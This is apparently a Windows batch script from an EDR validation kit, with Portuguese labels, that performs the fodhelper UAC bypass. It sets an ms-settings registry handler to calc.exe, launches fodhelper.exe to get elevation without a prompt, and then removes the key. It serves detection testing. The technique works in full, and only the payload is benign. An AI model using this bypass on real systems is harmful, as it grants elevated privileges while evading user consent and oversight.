@echo off
chcp 65001 >nul
title [08] Bypass de UAC (fodhelper) - Validacao EDR
color 0E
cls
echo ============================================================
echo   [08] BYPASS DE UAC via fodhelper
echo   MITRE ATT&CK: T1548.002  ^|  Severidade: ALTA
echo ============================================================
echo.
echo   Simula a elevacao de privilegio sem a janela do UAC.
echo   Carga inofensiva: calc.exe. O script limpa no final.
echo ============================================================
echo.
pause

echo.
echo [*] Criando chave de registro usada pelo fodhelper...
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "C:\Windows\System32\calc.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f

echo.
echo [*] Executando fodhelper.exe...
start "" fodhelper.exe

echo.
echo ------------------------------------------------------------
echo   Verifique o ALERTA no console do seu EDR.
echo   Esperado: UAC bypass / manipulacao de ms-settings (ALTA).
echo ------------------------------------------------------------
echo.
pause

echo.
echo [*] Limpando chave de registro...
reg delete "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f >nul 2>&1
echo [OK] Limpeza concluida.
echo.
pause
